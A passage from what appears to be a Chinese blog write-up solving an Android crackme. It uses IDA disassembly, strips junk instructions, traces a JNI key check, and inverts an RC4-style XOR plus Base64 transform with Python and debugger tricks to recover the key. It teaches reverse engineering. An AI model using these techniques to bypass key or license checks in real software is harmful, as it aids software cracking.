class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:00002BE8                 PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BEC                 POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF0                 B               sub_2C1A                     ；开始</span><br><span class="line"> PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BEC BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF0 13 E0                                         B               sub_2C1A</span><br><span class="line"> ---------------------------------------------------------------------------</span><br><span class="line">.text:00002BF2 BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002BF6 05 E0                                         B               sub_2C04 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002BF8 00 F1 01 00                                   ADD.W           R0, R0, #1</span><br><span class="line">.text:00002BFC 0A E0                                         B               loc_2C14 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002BFE 1B 46                                         MOV             R3, R3</span><br><span class="line">.text:00002C00 0E E0                                         B               loc_2C20 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C02 10 E0                                         B               sub_2C26 ；跳到快执行的位置 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C04 B1 B5                                         PUSH            &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C06 01 E0                                         B               loc_2C0C </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C08 12 46                                         MOV             R2, R2</span><br><span class="line">.text:00002C0A 01 E0                                         B               loc_2C10</span><br><span class="line">.text:00002C0C 82 B0                                         SUB             SP, SP, #8</span><br><span class="line">.text:00002C0E FB E7                                         B               loc_2C08 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C10 02 B0                                         ADD             SP, SP, #8</span><br><span class="line">.text:00002C12 F1 E7                                         B               loc_2BF8 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C14 A0 F1 01 00                                   SUB.W           R0, R0, #1</span><br><span class="line">.text:00002C18 F1 E7                                         B               loc_2BFE </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C1A 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C1E E8 E7                                         B               loc_2BF2 </span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">.text:00002C20 BD E8 B1 40                                   POP.W           &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C24 ED E7                                         B               sub_2C02 </span><br><span class="line">=======================================</span><br><span class="line">.text:00002C26 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C2A BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C2E FF E7                                         B               sub_2C30 ；进入有效代码，一般是接着的地址</span><br><span class="line"></span><br><span class="line">.text:00002C30                 PUSH            &#123;R0,R4,R5,R7,LR&#125; ；开始一般会有一段对称没啥作用的话指令</span><br><span class="line">.text:00002C32                 SUB             SP, SP, #8</span><br><span class="line">.text:00002C34                 MOV             R2, R2</span><br><span class="line">.text:00002C36                 ADD             SP, SP, #8</span><br><span class="line">.text:00002C38                 ADD.W           R0, R0, #1</span><br><span class="line">.text:00002C3C                 SUB.W           R0, R0, #1</span><br><span class="line">.text:00002C40                 MOV             R3, R3</span><br><span class="line">.text:00002C42                 POP.W           &#123;R0,R4,R5,R7,LR&#125;</span><br><span class="line">.text:00002C46                 ADD.W           R1, R1, #1</span><br><span class="line">.text:00002C4A                 SUB.W           R1, R1, #1</span><br><span class="line">.text:00002C4E                 STRH.W          R0, [SP,#arg_30]</span><br><span class="line">.text:00002C52                 MOVS            R0, #0x44</span><br><span class="line">.text:00002C54                 PUSH.W          &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C58                 POP.W           &#123;R4-R10,LR&#125;</span><br><span class="line">.text:00002C5C                 B               sub_2C86</span><br></pre></td></tr></table></figure> <p>特征：</p> <ol> <li>每跳转一个分支，基本都要一段花（记为A段），就是从上面代码中注释开始的问题</li> <li>进行几个跳转后，到了结束位置，跳入有效代码</li> <li>有效代码开头一般也有加一段花（记为B段）</li> <li>在A段话指令中，指令地址是向下增长的，也就是A开始往下拉一段，就能找到结束位置</li> <li>B端一般无跳转，但是对称代码有多又少</li> </ol> <p>所以根据特征，去除话指令也挺方便，我使用的IDA的patch功能手工去花的，脚本牛可以写个脚本。</p> <p>所有花指令填充的00 bf（NOP），然后就可以F5了。</p> <h2 id="关键点跟踪2"><a href="#关键点跟踪2" class="headerlink" title="关键点跟踪2"></a>关键点跟踪2</h2><p>然后接着调试跟踪。</p> <p>接着上面，后续会接着向该段内存填充字符（非直接填充，还有个段算法，根据初始话的0x20的值来做的），我没有仔细跟踪算法了，通过对些内存关键点下断，然后跳出循环位置下断，下面0000357A就是循环位置，如此多次之后，循环结束。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00003576 000 B4 F1 FF 3F                                   CMP.W           R4, #0xFFFFFFFF</span><br><span class="line">.text:0000357A 000 3F F7 74 AD                                   BGT.W           loc_3066</span><br></pre></td></tr></table></figure></p> <p>查看该内存数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5F019020 4A 00 79 00 75 00 33 00  43 00 4A 00 6C 00 56 00  J.y.u.3.C.J.l.V.</span><br><span class="line">5F019030 44 00 53 00 47 00 51 00  21 00 0A 00 00 00 00 00  D.S.G.Q.!.......</span><br></pre></td></tr></table></figure></p> <p>接着跳过一段花之后，调用了bl sub_19FC，跟入，发现结果和刚才那段基本一直，也是将字符写入内存，并且内存就是刚才那段，只是每次都有一个1偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000364A 000 FE F7 D7 F9                                   BL              sub_19FC</span><br><span class="line">...</span><br><span class="line">librf_chen.so:5EFFB52E                 ORR.W           R3, LR, R2,LSL#1</span><br><span class="line">librf_chen.so:5EFFB532                 LDRB.W          R0, [R8,R5,LSL#1]</span><br><span class="line">librf_chen.so:5EFFB536                 ADDS            R2, #1</span><br><span class="line">librf_chen.so:5EFFB538                 STRB.W          R0, [R12,R3] ；也是前面的位置，但是加了个1偏移</span><br></pre></td></tr></table></figure></p> <p>同样，结束之后，查看内存，通过后面分析，知道这段字符就是key加密变换之后要对比的字符串。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5ED12020  4A 50 79 6A 75 70 33 65  43 79 4A 6A 6C 6B 56 36  JPyjup3eCyJjlkV6</span><br><span class="line">5ED12030  44 6D 53 6D 47 48 51 3D  21 21 0A 0A 00 00 00 00  DmSmGHQ=!!......</span><br></pre></td></tr></table></figure> <p>子过程返回之后，接着b进入另一段。调了这么久，我们输入的key去哪里了？下面来了！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00003680 000 D9 F8 00 00                                   LDR.W           R0, [R9] 之前传入的参_JNIEnv</span><br><span class="line">.text:00003684 000 41 46                                         MOV             R1, R8 之前传入的参数，_jclass</span><br><span class="line">.text:00003686 000 00 22                                         MOVS            R2, #0</span><br><span class="line">.text:00003688 000 00 24                                         MOVS            R4, #0</span><br><span class="line">.text:0000368A 000 D0 F8 A4 32                                   LDR.W           R3, [R0,#0x2A4] libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55</span><br><span class="line">.text:0000368E 000 48 46                                         MOV             R0, R9 this指针</span><br><span class="line">.text:00003690 000 98 47                                         BLX             R3 libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55，返回输入的key的内存</span><br></pre></td></tr></table></figure> <p>先来看看check接口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</span><br></pre></td></tr></table></figure></p> <p>check参数在刚进入就被保存了，现在在00003680位置取出来，返回了我们输入的key到R0中（看注释）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5DC4BEC0  31 32 33 34 35 36 00 40  10 00 00 00 4B 00 00 00  123456.@....K...</span><br></pre></td></tr></table></figure> <p>然后，又调用了一个子过程来处理key，我这里先没有跟入，直解F8，看了返回值</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00003792 000 16 F0 09 FB                                   BL              sub_19DA8</span><br><span class="line">.text:00003796 000 01 46                                         MOV             R1, R0  ; key</span><br><span class="line">.text:00003798 000 DF F8 A4 04                                   LDR.W           R0, =(unk_20020 - 0x38D2)</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65 4B 2F 30 36 38 71 52  00 00 00 00 C0 BE C4 5D  eK/068qR</span><br></pre></td></tr></table></figure> <p>基本确认是加密函数，然后又把该结果和JPyjup3eCyJjlkV6DmSmGHQ=!!进行对比。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:000038CE 000 78 44                                         ADD             R0, PC ; 保存了JPyjup3eCyJjlkV6DmSmGHQ=!!</span><br><span class="line">.text:000038D0</span><br><span class="line">.text:000038D0                                   AGAIN_18                                ; CODE XREF: sub_2874+10D</span><br><span class="line">.text:000038D0 000 0A 5D                                         LDRB            R2, [R1,R4]；R1保存了eK/068qR 取出一个字符</span><br><span class="line">.text:000038D2 000 03 5D                                         LDRB            R3, [R0,R4]；取出一个字符</span><br><span class="line">.text:000038D4 000 93 42                                         CMP             R3, R2</span><br><span class="line">.text:000038D6 000 40 F0 6B 80                                   BNE.W           loc_39B0 ; jmp 3A1A</span><br><span class="line">.text:000038DA 000 01 34                                         ADDS            R4, #1</span><br><span class="line"></span><br><span class="line">.text:00003942 000 18 2C                                         CMP             R4, #0x18</span><br><span class="line">.text:00003944 000 C4 D1                                         BNE             AGAIN_18</span><br><span class="line"></span><br><span class="line">.text:000039AC 000 01 20                                         MOVS            R0, #1</span><br><span class="line">.text:000039AE 000 3B E1                                         B               loc_3C28</span><br><span class="line"></span><br><span class="line">.text:00003A86 000 00 28                                         CMP             R0, #0</span><br><span class="line">.text:00003A88 000 00 F0 67 80                                   BEQ.W           TAG_FAILED</span><br><span class="line">.text:00003C26 000 00 20                                         MOVS            R0, #0</span><br></pre></td></tr></table></figure> <p>取出一个字符进行比较，不同则跳转，相同R4加1，继续比价直到超过0x18（也就是加密结果长度0x18），都相同了R0=1</p> <p>看看不同时跳转的代码，sub_27C8是一个类似鱼strstr的代码，我本以为加密之后结果可以部分匹配也行，结果我错了，作者坑人，因为这个sub_27C8就算返回1，也就是部分匹配成功了，也会进入00003C26，R0=0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00003A1A 000 78 44                                         ADD             R0, PC  ; result</span><br><span class="line">.text:00003A1C 000 FE F7 D4 FE                                   BL              sub_27C8 ; 在result中找key，找到匹配的一段，返回匹配位置，否则返回0</span><br></pre></td></tr></table></figure></p> <p>所以加密结果必须是0x18，和JPyjup3eCyJjlkV6DmSmGHQ=!!完全匹配(0x18字节)</p> <h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>现在重新跟入加密子过程sub_19DA8，看看是怎么个算法。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00019DA8                                   sub_19DA8                      ; CODE XREF: sub_2874+F1E</span><br><span class="line">.text:00019DA8</span><br><span class="line">.text:00019DA8                                   var_10          = -0x10</span><br><span class="line">.text:00019DA8</span><br><span class="line">.text:00019DA8 000 2D E9 F0 43                                   PUSH.W          &#123;R4-R9,LR&#125;</span><br><span class="line">.text:00019DAC 01C 03 AF                                         ADD             R7, SP, #0xC</span><br><span class="line">.text:00019DAE 01C AD F5 81 6D                                   SUB.W           SP, SP, #0x408</span><br><span class="line">.text:00019DB2 424 81 B0                                         SUB             SP, SP, #4</span><br><span class="line">.text:00019DB4 428 81 46                                         MOV             R9, R0</span><br><span class="line">.text:00019DB6 428 DF F8 5C 05                                   LDR.W           R0, =(__stack_chk_guard_ptr - 0x19DBE)</span><br><span class="line">.text:00019DBA 428 78 44                                         ADD             R0, PC ; __stack_chk_guard_ptr</span><br><span class="line">.text:00019DBC 428 00 68                                         LDR             R0, [R0] ; __stack_chk_guard</span><br><span class="line">.text:00019DBE 428 00 68                                         LDR             R0, [R0]</span><br><span class="line">.text:00019DC0 428 47 F8 10 0C                                   STR.W           R0, [R7,#var_10]</span><br><span class="line">.text:00019DC4 428 00 F0 AA FA                                   BL              sub_1A31C ;</span><br><span class="line">.text:00019DC4                                                                           ; 返回199319124851!</span><br><span class="line">.text:00019DC8 428 80 46                                         MOV             R8, R0</span><br><span class="line">.text:00019DCA 428 48 46                                         MOV             R0, R9</span><br></pre></td></tr></table></figure> <p>先通过sub_1A31C子函数返回了一串字符199319124851!，算法和生成JPyjup3eCyJjlkV6DmSmGHQ=!!字符类似，不再细说。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00019F80 428 20 46                                         MOV             R0, R4  ; size</span><br><span class="line">.text:00019F82 428 E7 F7 14 EC                                   BLX             malloc //分配内存来保存第一次加密结果</span><br><span class="line">.text:00019F86 428 21 46                                         MOV             R1, R4</span><br><span class="line">.text:00019F88 428 05 46                                         MOV             R5, R0</span><br><span class="line">text:00019FF0 428 E7 F7 E2 EB                                   BLX             __aeabi_memclr；清零</span><br><span class="line">.text:00019FF4 428 6C 46                                         MOV             R4, SP</span><br><span class="line">.text:00019FF6 428 08 21                                         MOVS            R1, #8  ; a2</span><br><span class="line">.text:00019FF8 428 20 46                                         MOV             R0, R4  ; result</span><br><span class="line">.text:00019FFA 428 42 46                                         MOV             R2, R8  ; str</span><br><span class="line"></span><br><span class="line">.text:0001A0C8 428 EB F7 8C FA                                   BL              sub_55E4 ; str = &quot;199310124851!&quot;</span><br><span class="line">.text:0001A0C8                                                                           ; a2 长度+2</span><br><span class="line">.text:0001A0CC 428 20 46                                         MOV             R0, R4  ; p</span><br><span class="line">.text:0001A0CE 428 31 46                                         MOV             R1, R6  ; key_len</span><br><span class="line">.text:0001A0D0 428 4A 46                                         MOV             R2, R9  ; key</span><br><span class="line">.text:0001A0D2 428 2B 46                                         MOV             R3, R5  ; pKeyResult</span><br></pre></td></tr></table></figure> <p>然后分配了一段内存，用于保存第一次加密的key结果。<br>调用sub_55E4，将199310124851!通过变换放入一个8字节+0x100*4的数组(初始化为0-0x100)空间,挺绕的，由于这个函数跟key没有多大关系，所以咩必要细究是怎么做的，可以直接将计算后内存dump出来用后面的逆运算（其实我没用上）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0001A13A 428 EA F7 A0 FA                                   BL              sub_467E;第一次加密变换</span><br><span class="line">.text:0001A13E 428 28 46                                         MOV             R0, R5</span><br></pre></td></tr></table></figure> <p>然后sub_467E进行第一次加密变换，将key和前面的8字节+0x100*4的数组组队的xor，细节直接看代码(完整的我会放idb)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v4 = p-&gt;unk_0;</span><br><span class="line">  v5 = p-&gt;unk_4;</span><br><span class="line">  if ( key_len &gt;&gt; 3 )                           // 8 &gt;&gt; 3 = 1</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = -(key_len &gt;&gt; 3);                       // -2</span><br><span class="line">    v7 = pKeyResult + 8 * (key_len &gt;&gt; 3);       // 2*8</span><br><span class="line">    key1 = key;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      ++v6;</span><br><span class="line">      v9 = (unsigned __int8)(v4 + 1);           // 1</span><br><span class="line">      v10 = p-&gt;index[v9];                       // p-&gt;Index[1]</span><br><span class="line">      v11 = v5 + v10;                           // 0+p-&gt;Index[1]</span><br><span class="line">      v12 = p-&gt;index[v11];</span><br><span class="line">      p-&gt;index[v9] = v12;</span><br><span class="line">      p-&gt;index[v11] = v10;</span><br><span class="line">      *(_BYTE *)pKeyResult = p-&gt;index[(unsigned __int8)(v10 + v12)] ^ *(_BYTE *)key1;</span><br><span class="line">      v13 = (unsigned __int8)(v4 + 2);          // 2</span><br><span class="line">      v14 = p-&gt;index[v13];                      // p-&gt;Index[2]</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p> <p>这里我没有暂时没有渗入理解，直接进入第二次加密运算。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0001A222 428 01 44                                         ADD             R1, R0 ；长度</span><br><span class="line">.text:0001A224 428 28 46                                         MOV             R0, R5 ；第一次加密结果</span><br><span class="line">.text:0001A226 428 EB F7 69 FC                                   BL              sub_5AFC ;第二次加密</span><br><span class="line">.text:0001A22A 428 3B 49                                         LDR             R1, =(__stack_chk_guard_ptr - 0x1A300)</span><br></pre></td></tr></table></figure> <p>进入sub_5AFC，将key每3个字节一组，进行<code>&lt;&lt;8</code>拼接，也就是<code>a1&lt;&lt;16+a2&lt;&lt;8+a3</code>，举个例子<code>0xaa,0xbb,0xcc=&gt;0xaabbcc</code></p> <p>然后拼接结果v15再左移，<br>如果是3个字符拼接的，这里v16是3，<code>v19=v15 &lt;&lt; 8 * (3 - v16)</code>也就左移0，也就是不左移;<br>如果是两个字符或者一个字符拼接的，这里就需要左移8或者16位，说白了就是需要构成0x112233的结构。</p> <p>然后v19进行4次移位，取aAbcdefghijklmn字符放入结果内存中。其实就是v19按6位进行分割（分别右移0x12,0xc,0x6,0x0，&amp;03f），分割的值作为index，去aAbcdefghijklmn中对应字符，保存。<br>如果<code>v16&lt;3</code>，也就是此次拼接没有3个字符，这里<code>index=0x40</code>，也就是增加额外的”=”用于结果。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">if ( _R10 &gt; 0 )                               // len&gt;0</span><br><span class="line">  &#123;</span><br><span class="line">    i = 0;</span><br><span class="line">    p1 = p;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      if ( i &gt;= _R10 )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = 0;</span><br><span class="line">        v15 = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ii = 0;</span><br><span class="line">        v15 = 0;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = *(_BYTE *)(key + i + ii) | (v15 &lt;&lt; 8);// </span><br><span class="line">                                                // v15 = key[i] | 0&lt;&lt;8</span><br><span class="line">                                                // v15 = key[i+1] | v15&lt;&lt;8</span><br><span class="line">      // v15 = key[i+1] | v15&lt;&lt;8</span><br><span class="line">          v16 = ii + 1;</span><br><span class="line">          if ( ii + 1 &gt; 2 )                     // 0, 1</span><br><span class="line">            break;</span><br><span class="line">          v17 = i + ii++;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v17 + 1 &lt; _R10 );</span><br><span class="line">        i += v16;                               // v16 = 1, 2, 3</span><br><span class="line">                                                // i += v16, 下次计算使用的i</span><br><span class="line">      &#125;</span><br><span class="line">      j = 0;</span><br><span class="line">      v19 = v15 &lt;&lt; 8 * (3 - v16);</span><br><span class="line">      v20 = 0x12;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v16 &lt; j )</span><br><span class="line">          index = 0x40;</span><br><span class="line">        else</span><br><span class="line">          index = (v19 &gt;&gt; v20) &amp; 0x3F;</span><br><span class="line">        v20 -= 6;</span><br><span class="line">        *((_BYTE *)p1 + j++) = aAbcdefghijklmn[index];</span><br><span class="line">      &#125;</span><br><span class="line">      while ( j != 4 );                         // 每4字节</span><br><span class="line">      p1 = (char *)p1 + 4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i &lt; _R10 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure> <h1 id="逆向算法"><a href="#逆向算法" class="headerlink" title="逆向算法"></a>逆向算法</h1><p>算法大致明白了，结果又是JPyjup3eCyJjlkV6DmSmGHQ=（取了0x18字节）。那么将第二次加密进行求逆。<br>先找JPyjup3eCyJjlkV6DmSmGHQ=每字节在’ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=’中的index。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">k = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;</span><br><span class="line">r = &apos;JPyjup3eCyJjlkV6DmSmGHQ=&apos; #//!!&apos;</span><br><span class="line">idd = []</span><br><span class="line">def get_index_in_k(c):</span><br><span class="line">    for i in range(0, len(k)):</span><br><span class="line">        c1 = k[i:i+1]</span><br><span class="line">        if c1 == c:</span><br><span class="line">            return i</span><br><span class="line">    return -1</span><br><span class="line">            </span><br><span class="line">def cc():</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(0, len(r)):</span><br><span class="line">        c1 = r[i: i+1]</span><br><span class="line">        index = get_index_in_k(c1)</span><br><span class="line">        idd.append(index) #保存序号</span><br><span class="line">        print &apos;%d: %c %d %x&apos; % (i+1, c1, index, index )</span><br></pre></td></tr></table></figure> <p>结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1: J 9 9</span><br><span class="line">2: P 15 f</span><br><span class="line">3: y 50 32</span><br><span class="line">4: j 35 23</span><br><span class="line">5: u 46 2e</span><br><span class="line">6: p 41 29</span><br><span class="line">7: 3 55 37</span><br><span class="line">8: e 30 1e</span><br><span class="line">9: C 2 2</span><br><span class="line">10: y 50 32</span><br><span class="line">11: J 9 9</span><br><span class="line">12: j 35 23</span><br><span class="line">13: l 37 25</span><br><span class="line">14: k 36 24</span><br><span class="line">15: V 21 15</span><br><span class="line">16: 6 58 3a</span><br><span class="line">17: D 3 3</span><br><span class="line">18: m 38 26</span><br><span class="line">19: S 18 12</span><br><span class="line">20: m 38 26</span><br><span class="line">21: G 6 6</span><br><span class="line">22: H 7 7</span><br><span class="line">23: Q 16 10</span><br><span class="line">24: = 64 40</span><br></pre></td></tr></table></figure></p> <p>然后每4个index一组，来自于v19的4次右移，那么反过来4个一组，左移相加就是v19</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for i in range(0, len(idd), 4):</span><br><span class="line">        a1 = idd[i] &lt;&lt; 0x12</span><br><span class="line">        a2 = idd[i+1] &lt;&lt; 0xc</span><br><span class="line">        a3 = idd[i+2] &lt;&lt; 0x6</span><br><span class="line">        a4 = 0</span><br><span class="line">        if idd[i+3] == 0x40:</span><br><span class="line">            a4 = 0</span><br><span class="line">        else:</span><br><span class="line">            a4 = idd[i+3] &lt;&lt; 0</span><br><span class="line">        a = a1+ a2+a3+a4</span><br><span class="line">        rrr.append(a)</span><br><span class="line">        print &apos;%d: %x&apos; % (i, a)</span><br></pre></td></tr></table></figure> <p>得到结果：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: 24fca3</span><br><span class="line">4: ba9dde</span><br><span class="line">8: b2263</span><br><span class="line">12: 96457a</span><br><span class="line">16: e64a6</span><br><span class="line">20: 1874</span><br></pre></td></tr></table></figure> <p>然后我们又知道v19其实是v15拼接的，所以拆开就得到v15（第一次加密结果），可以看到key长度应该是17。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24 fc a3 ba 9d de 0b 22 63 96 45 7a 0e 64 a6 18 74</span><br></pre></td></tr></table></figure></p> <p>然后接着求第一次加密的逆运算，看代码，好多啊，怎么办，难道要求逆，好难！<br>好吧，不装了，其实不难，我们看前面说的第一次加密其实就是分组xor！<br>xor好啊，xor好啊…我们知道xor两次会将结果还原，想到了什么？！<br>是的，既然我们拿到第一次加密结果，那让他再和哪个8字节+0x100*4的数组再xor一次不久可以了，但是要重写这个加密代码貌似也挺麻烦的，怎么办？！</p> <p>这里我是这么做的，在调试中，第一次加密前，将key的值（本来是输入）修改为上面得到的第一次加密结果，然后开始第一次加密运算，这样不就完美的完成了一次求逆吗，哈哈！</p> <p>具体操作，对1A13A下断，输入key（必须是17位，否则修改内存时可能会挂），确认，断下来，此时r2就是key</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B20  31 32 33 34 35 36 37 38  39 30 31 32 33 34 35 36  1234567890123456</span><br><span class="line">5E127B30  37 00 6D 5F 1B 00 00 00  00 00 00 00 